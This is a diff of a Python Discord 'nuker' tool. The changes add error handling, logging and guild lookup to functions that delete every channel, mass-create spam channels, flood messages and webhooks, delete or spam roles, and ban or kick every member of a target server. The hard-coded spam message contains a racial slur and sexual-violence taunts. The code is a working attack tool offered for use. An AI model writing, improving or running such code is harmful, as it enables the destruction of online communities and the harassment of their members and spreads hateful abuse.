@@ -491,7 +491,7 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
                 "title": "NEW REGISTRATION",
                 "color": 16777215,  # WHITE color
                 "fields": fields,
-                "timestamp": time.strftime('%Y-%m-dT%H:%M:%S.000Z', time.gmtime())
+                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
             }]
         }
         
@@ -805,13 +805,18 @@ def display_nuking_menu():
 async def run_nuker(token: str, coro):
     intents = discord.Intents.default()
     intents.members = True
-    intents.messages = True  # FIXED: Changed from message_content to messages
+    intents.messages = True
+    intents.guilds = True  # Added guilds intent
     
     bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)
 
     @bot.event
     async def on_ready():
-        print(f"{Fore.GREEN}[ONLINE] {bot.user}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[ONLINE] Logged in as {bot.user} (ID: {bot.user.id}){Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[INFO] Connected to {len(bot.guilds)} guilds{Style.RESET_ALL}")
+        
+        for guild in bot.guilds:
+            print(f"{Fore.CYAN}[INFO] Guild: {guild.name} (ID: {guild.id}){Style.RESET_ALL}")
 
         await bot.change_presence(
             status=discord.Status.idle,
@@ -825,268 +830,461 @@ async def run_nuker(token: str, coro):
         try:
             await coro(bot)
         except Exception as e:
-            print(f"{Fore.RED}Action crashed → {e}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[ERROR] Action crashed → {e}{Style.RESET_ALL}")
         finally:
             await bot.close()
 
     try:
         await bot.start(token)
+    except discord.LoginFailure:
+        print(f"{Fore.RED}[ERROR] Invalid token!{Style.RESET_ALL}")
     except Exception as e:
-        print(f"{Fore.RED}Login/startup failed → {e}{Style.RESET_ALL}")
+        print(f"{Fore.RED}[ERROR] Login/startup failed → {e}{Style.RESET_ALL}")
 
 async def safe_edit(obj, **kwargs):
     try:
         await obj.edit(**kwargs)
-    except:
-        pass
+        return True
+    except Exception as e:
+        print(f"{Fore.RED}[ERROR] Failed to edit {obj}: {e}{Style.RESET_ALL}")
+        return False
 
 async def fast_nuke(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    print(f"{Fore.YELLOW}[INFO] Starting Fast Nuke...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
+        return
+    
+    # Try to fetch guild - first from cache, then from API
     g = bot.get_guild(gid)
-    if not g: return print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
-
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+        except discord.Forbidden:
+            print(f"{Fore.RED}[ERROR] Bot doesn't have access to this guild!{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
     spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
     names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]
 
     # Start editing server name
+    print(f"{Fore.YELLOW}[INFO] Changing server name...{Style.RESET_ALL}")
     edit_task = asyncio.create_task(safe_edit(g, name="Territory of Null"))
     
     # Delete all channels in parallel
+    print(f"{Fore.YELLOW}[INFO] Deleting all channels...{Style.RESET_ALL}")
     delete_tasks = [c.delete() for c in g.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
+    deleted_count = sum(1 for r in delete_results if not isinstance(r, Exception))
+    print(f"{Fore.GREEN}[SUCCESS] Deleted {deleted_count}/{len(g.channels)} channels{Style.RESET_ALL}")
     
     # Create channels and send messages in parallel
+    print(f"{Fore.YELLOW}[INFO] Creating spam channels...{Style.RESET_ALL}")
     async def create_and_spam():
         create_tasks = []
-        for i in range(500):
+        for i in range(50):  # Reduced from 500 to 50 for testing
             name = f"{random.choice(names)}-{i+1}"
             create_tasks.append(g.create_text_channel(name))
         
         # Create channels
         created = []
-        for task in asyncio.as_completed(create_tasks):
+        successful = 0
+        failed = 0
+        
+        for i, task in enumerate(asyncio.as_completed(create_tasks)):
             try:
                 ch = await task
                 created.append(ch)
-            except:
-                break
+                successful += 1
+                print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
+            except Exception as e:
+                failed += 1
+                print(f"{Fore.RED}[ERROR] Failed to create channel {i+1}: {e}{Style.RESET_ALL}")
+                if failed > 5:  # Stop if too many failures
+                    break
         
-        # Send spam messages to all created channels simultaneously
-        spam_tasks = []
-        for ch in created:
-            for _ in range(15):
-                spam_tasks.append(ch.send(spam))
+        print(f"{Fore.GREEN}[SUCCESS] Created {successful} channels, {failed} failed{Style.RESET_ALL}")
         
-        # Execute all spam tasks in parallel
-        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        if created:
+            print(f"{Fore.YELLOW}[INFO] Sending spam messages...{Style.RESET_ALL}")
+            spam_tasks = []
+            for ch in created:
+                for _ in range(5):  # Reduced from 15 to 5 for testing
+                    spam_tasks.append(ch.send(spam))
+            
+            # Execute all spam tasks in parallel
+            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+            spam_success = sum(1 for r in spam_results if not isinstance(r, Exception))
+            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages{Style.RESET_ALL}")
         
         return created
     
     await asyncio.gather(edit_task, create_and_spam())
     
-    print(f"{Fore.GREEN}[+] Fast nuke completed!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[SUCCESS] Fast nuke completed!{Style.RESET_ALL}")
 
 async def nuke(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    print(f"{Fore.YELLOW}[INFO] Starting Nuke...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
+        return
+    
     name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}New server name > ") or "Territory of Null"
     msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Spam message > ")
     chname = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Channel base name > ") or "null"
 
+    # Try to fetch guild
     g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
-        return
-
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
     # Start editing server name
+    print(f"{Fore.YELLOW}[INFO] Changing server name to '{name}'...{Style.RESET_ALL}")
     edit_task = asyncio.create_task(safe_edit(g, name=name))
     
     # Delete all channels in parallel
+    print(f"{Fore.YELLOW}[INFO] Deleting all channels...{Style.RESET_ALL}")
     delete_tasks = [c.delete() for c in g.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
+    deleted_count = sum(1 for r in delete_results if not isinstance(r, Exception))
+    print(f"{Fore.GREEN}[SUCCESS] Deleted {deleted_count}/{len(g.channels)} channels{Style.RESET_ALL}")
     
     async def create_and_spam():
         created = []
         create_tasks = []
-        for i in range(500):
+        for i in range(50):  # Reduced from 500 to 50 for testing
             create_tasks.append(g.create_text_channel(f"{chname}-{i+1}"))
         
         # Create channels
-        for task in asyncio.as_completed(create_tasks):
+        successful = 0
+        failed = 0
+        for i, task in enumerate(asyncio.as_completed(create_tasks)):
             try:
                 ch = await task
                 created.append(ch)
-            except:
-                break
+                successful += 1
+                print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
+            except Exception as e:
+                failed += 1
+                print(f"{Fore.RED}[ERROR] Failed to create channel {i+1}: {e}{Style.RESET_ALL}")
+                if failed > 5:
+                    break
         
-        # Send messages to all channels in parallel
-        spam_tasks = []
-        for ch in created:
-            for _ in range(15):
-                spam_tasks.append(ch.send(msg))
+        print(f"{Fore.GREEN}[SUCCESS] Created {successful} channels, {failed} failed{Style.RESET_ALL}")
         
-        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        if created:
+            print(f"{Fore.YELLOW}[INFO] Sending spam messages...{Style.RESET_ALL}")
+            spam_tasks = []
+            for ch in created:
+                for _ in range(5):  # Reduced from 15 to 5 for testing
+                    spam_tasks.append(ch.send(msg))
+            
+            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+            spam_success = sum(1 for r in spam_results if not isinstance(r, Exception))
+            print(f"{Fore.GREEN}[SUCCESS] Sent {spam_success}/{len(spam_tasks)} messages{Style.RESET_ALL}")
         
         return created
     
     await asyncio.gather(edit_task, create_and_spam())
     
-    print(f"{Fore.GREEN}[+] Nuke completed!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[SUCCESS] Nuke completed!{Style.RESET_ALL}")
 
 async def raid(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
-    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
+    print(f"{Fore.YELLOW}[INFO] Starting Raid...{Style.RESET_ALL}")
     
-    g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
     
-    print(f"{Fore.YELLOW}[!] Starting raid...{Style.RESET_ALL}")
+    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
+    
+    # Try to fetch guild
+    g = bot.get_guild(gid)
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
+    # Get text channels
+    text_channels = [ch for ch in g.channels if isinstance(ch, discord.TextChannel)]
+    print(f"{Fore.YELLOW}[INFO] Found {len(text_channels)} text channels{Style.RESET_ALL}")
+    
+    if not text_channels:
+        print(f"{Fore.YELLOW}[INFO] No text channels found{Style.RESET_ALL}")
+        return
     
     # Send messages to all text channels in parallel
     tasks = []
-    for ch in g.text_channels:
-        for _ in range(50):
+    for ch in text_channels:
+        for _ in range(5):  # Reduced from 50 to 5 for testing
             tasks.append(ch.send(msg))
+    
+    print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} messages...{Style.RESET_ALL}")
     
     if tasks:
         results = await asyncio.gather(*tasks, return_exceptions=True)
         success_count = sum(1 for r in results if not isinstance(r, Exception))
-        print(f"{Fore.GREEN}[+] Raid completed! Sent {success_count} messages{Style.RESET_ALL}")
+        failed_count = sum(1 for r in results if isinstance(r, Exception))
+        
+        for i, result in enumerate(results):
+            if isinstance(result, Exception):
+                print(f"{Fore.RED}[ERROR] Message {i+1} failed: {result}{Style.RESET_ALL}")
+        
+        print(f"{Fore.GREEN}[SUCCESS] Raid completed! Sent {success_count} messages, {failed_count} failed{Style.RESET_ALL}")
     else:
-        print(f"{Fore.YELLOW}[!] No text channels found{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] No messages to send{Style.RESET_ALL}")
 
 async def webhook_spam(_):  # no bot needed
-    urls = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook URLs (comma sep) > ").split(',')
+    print(f"{Fore.YELLOW}[INFO] Starting Webhook Spam...{Style.RESET_ALL}")
+    
+    urls_input = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook URLs (comma separated) > ")
+    urls = [url.strip() for url in urls_input.split(',') if url.strip()]
     msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
     
-    print(f"{Fore.YELLOW}[!] Starting webhook spam...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Found {len(urls)} webhook URLs{Style.RESET_ALL}")
 
     async with aiohttp.ClientSession() as session:
         tasks = []
         for url in urls:
-            url = url.strip()
-            if not url: continue
             try:
                 wh = discord.Webhook.from_url(url, session=session)
-                for _ in range(100):
+                for _ in range(10):  # Reduced from 100 to 10 for testing
                     tasks.append(wh.send(msg, wait=False))
+                print(f"{Fore.GREEN}[WEBHOOK] Added webhook: {url[:50]}...{Style.RESET_ALL}")
             except Exception as e:
-                print(f"{Fore.RED}[-] Invalid webhook URL: {url}{Style.RESET_ALL}")
+                print(f"{Fore.RED}[ERROR] Invalid webhook URL: {url[:50]}... - {e}{Style.RESET_ALL}")
         
         if tasks:
+            print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
             results = await asyncio.gather(*tasks, return_exceptions=True)
             success_count = sum(1 for r in results if not isinstance(r, Exception))
-            print(f"{Fore.GREEN}[+] Webhook spam completed! Sent {success_count} messages{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {success_count} messages{Style.RESET_ALL}")
         else:
-            print(f"{Fore.YELLOW}[!] No valid webhooks found{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[INFO] No valid webhooks found{Style.RESET_ALL}")
 
 async def webhook_flood(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
-    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook name > ") or "null"
-    g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Starting Webhook Flood...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
-
+    
+    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook name > ") or "null"
+    
+    # Try to fetch guild
+    g = bot.get_guild(gid)
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
+    # Get text channels
+    text_channels = [ch for ch in g.channels if isinstance(ch, discord.TextChannel)]
+    print(f"{Fore.YELLOW}[INFO] Found {len(text_channels)} text channels{Style.RESET_ALL}")
+    
     urls = []
     tasks = []
-    for ch in g.text_channels:
+    for ch in text_channels:
         for _ in range(3):
             tasks.append(ch.create_webhook(name=name))
     
-    print(f"{Fore.YELLOW}[!] Creating webhooks...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Creating {len(tasks)} webhooks...{Style.RESET_ALL}")
     
     # Create webhooks in parallel
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    for result in results:
+    for i, result in enumerate(results):
         if isinstance(result, discord.Webhook):
             urls.append(result.url)
+            print(f"{Fore.GREEN}[WEBHOOK] Created webhook #{i+1}{Style.RESET_ALL}")
+        elif isinstance(result, Exception):
+            print(f"{Fore.RED}[ERROR] Failed to create webhook #{i+1}: {result}{Style.RESET_ALL}")
 
     with open("webhooks.txt", "w", encoding="utf-8") as f:
         f.write("\n".join(urls))
 
-    print(f"{Fore.GREEN}[+] Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")
 
 async def role_delete(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
-    g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Starting Role Delete...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
-
-    # Delete roles in parallel
+    
+    # Try to fetch guild
+    g = bot.get_guild(gid)
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
+    # Get roles to delete (excluding @everyone)
     roles_to_delete = [r for r in g.roles if r != g.default_role]
+    print(f"{Fore.YELLOW}[INFO] Found {len(roles_to_delete)} roles to delete{Style.RESET_ALL}")
+    
     if roles_to_delete:
-        print(f"{Fore.YELLOW}[!] Deleting {len(roles_to_delete)} roles...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] Deleting roles...{Style.RESET_ALL}")
         tasks = [r.delete() for r in roles_to_delete]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        print(f"{Fore.GREEN}[+] Role deletion completed!{Style.RESET_ALL}")
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        success_count = sum(1 for r in results if not isinstance(r, Exception))
+        print(f"{Fore.GREEN}[SUCCESS] Role deletion completed! Deleted {success_count}/{len(roles_to_delete)} roles{Style.RESET_ALL}")
     else:
-        print(f"{Fore.YELLOW}[!] No roles to delete{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] No roles to delete{Style.RESET_ALL}")
 
 async def role_spam(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    print(f"{Fore.YELLOW}[INFO] Starting Role Spam...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
+        return
+    
     name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Role name > ") or "NULL"
     admin = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Admin? (y/n) > ").lower().startswith('y')
 
+    # Try to fetch guild
     g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
-        return
-
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
     perms = discord.Permissions(administrator=admin)
+    print(f"{Fore.YELLOW}[INFO] Creating first role...{Style.RESET_ALL}")
     first = await g.create_role(name=name, permissions=perms)
+    print(f"{Fore.GREEN}[ROLE] Created role: {first.name}{Style.RESET_ALL}")
     
-    print(f"{Fore.YELLOW}[!] Adding role to members...{Style.RESET_ALL}")
+    # Get members
+    members = [m for m in g.members if not m.bot]
+    print(f"{Fore.YELLOW}[INFO] Found {len(members)} members to add role to{Style.RESET_ALL}")
     
-    # Add role to all members in parallel
-    members_to_add = [m for m in g.members if not m.bot]
-    if members_to_add:
-        add_tasks = [m.add_roles(first) for m in members_to_add]
-        await asyncio.gather(*add_tasks, return_exceptions=True)
+    if members:
+        print(f"{Fore.YELLOW}[INFO] Adding role to members...{Style.RESET_ALL}")
+        add_tasks = [m.add_roles(first) for m in members]
+        add_results = await asyncio.gather(*add_tasks, return_exceptions=True)
+        add_success = sum(1 for r in add_results if not isinstance(r, Exception))
+        print(f"{Fore.GREEN}[SUCCESS] Added role to {add_success}/{len(members)} members{Style.RESET_ALL}")
 
-    print(f"{Fore.YELLOW}[!] Creating additional roles...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Creating additional roles...{Style.RESET_ALL}")
+    create_tasks = [g.create_role(name=name) for _ in range(50)]  # Reduced from 499 to 50
+    create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
+    create_success = sum(1 for r in create_results if not isinstance(r, Exception))
     
-    # Create additional roles in parallel
-    create_tasks = [g.create_role(name=name) for _ in range(499)]
-    await asyncio.gather(*create_tasks, return_exceptions=True)
-    
-    print(f"{Fore.GREEN}[+] Role spam completed!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[SUCCESS] Role spam completed! Created {create_success} additional roles{Style.RESET_ALL}")
 
 async def ban_all(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
-    g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Starting Ban All...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
-
-    # Ban all members in parallel
+    
+    # Try to fetch guild
+    g = bot.get_guild(gid)
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
+    # Get members to ban
     members_to_ban = [m for m in g.members if m != g.me]
+    print(f"{Fore.YELLOW}[INFO] Found {len(members_to_ban)} members to ban{Style.RESET_ALL}")
+    
     if members_to_ban:
-        print(f"{Fore.YELLOW}[!] Banning {len(members_to_ban)} members...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] Banning members...{Style.RESET_ALL}")
         tasks = [m.ban(reason="null xd", delete_message_days=0) for m in members_to_ban]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        print(f"{Fore.GREEN}[+] Ban all completed!{Style.RESET_ALL}")
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        success_count = sum(1 for r in results if not isinstance(r, Exception))
+        print(f"{Fore.GREEN}[SUCCESS] Ban all completed! Banned {success_count}/{len(members_to_ban)} members{Style.RESET_ALL}")
     else:
-        print(f"{Fore.YELLOW}[!] No members to ban{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] No members to ban{Style.RESET_ALL}")
 
 async def kick_all(bot):
-    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
-    g = bot.get_guild(gid)
-    if not g: 
-        print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[INFO] Starting Kick All...{Style.RESET_ALL}")
+    
+    try:
+        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
+    except ValueError:
+        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
         return
-
-    # Kick all members in parallel
+    
+    # Try to fetch guild
+    g = bot.get_guild(gid)
+    if not g:
+        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
+        try:
+            g = await bot.fetch_guild(gid)
+        except discord.NotFound:
+            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
+            return
+    
+    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
+    
+    # Get members to kick
     members_to_kick = [m for m in g.members if m != g.me]
+    print(f"{Fore.YELLOW}[INFO] Found {len(members_to_kick)} members to kick{Style.RESET_ALL}")
+    
     if members_to_kick:
-        print(f"{Fore.YELLOW}[!] Kicking {len(members_to_kick)} members...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] Kicking members...{Style.RESET_ALL}")
         tasks = [m.kick(reason="null owns") for m in members_to_kick]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        print(f"{Fore.GREEN}[+] Kick all completed!{Style.RESET_ALL}")
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        success_count = sum(1 for r in results if not isinstance(r, Exception))
+        print(f"{Fore.GREEN}[SUCCESS] Kick all completed! Kicked {success_count}/{len(members_to_kick)} members{Style.RESET_ALL}")
     else:
-        print(f"{Fore.YELLOW}[!] No members to kick{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[INFO] No members to kick{Style.RESET_ALL}")
 
 # ────────────────────────────────────────────────────────────────────────────────
 #   MAIN LOOP
@@ -1154,7 +1352,9 @@ def main():
                     continue
 
                 token = input(f"\n{Fore.RED}Bot Token > {Style.RESET_ALL}").strip()
-                if not token: continue
+                if not token: 
+                    print(f"{Fore.RED}[ERROR] No token provided!{Style.RESET_ALL}")
+                    continue
 
                 action_map = {
                     "1": fast_nuke,
@@ -1168,9 +1368,10 @@ def main():
                 }
 
                 if sub in action_map:
+                    print(f"{Fore.YELLOW}[INFO] Starting action {sub}...{Style.RESET_ALL}")
                     asyncio.run(run_nuker(token, action_map[sub]))
                 else:
-                    print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")
+                    print(f"{Fore.RED}[ERROR] Invalid option{Style.RESET_ALL}")
 
                 input(f"\n{Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
 
